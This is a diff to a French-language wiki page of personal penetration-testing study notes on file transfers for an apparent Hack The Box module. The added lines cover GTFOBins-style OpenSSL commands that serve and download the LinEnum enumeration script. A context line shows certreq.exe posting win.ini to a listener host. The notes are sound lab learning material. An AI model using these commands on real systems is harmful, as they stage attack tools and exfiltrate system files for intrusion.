@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T15:47:07.347Z
+date: 2025-05-04T15:50:14.649Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -909,5 +909,25 @@ certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 #### GTFOBins
 
 Pour rechercher sur le projet GTFOBins, il est possible d'effectuer une recherche. Par exemple, pour voir tous les binaires permettant l'envoi de fichiers: `+file download`.
+
+Voici un exemple avec OpenSSL.
+
+Créer un certificat auto-signé:
+
+```
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
+
+Créer un serveur OpenSSL qui envoi le contenu d'un fichier lors des requètes:
+
+```
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+
+Télécharger le fichier:
+
+```
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
 
 
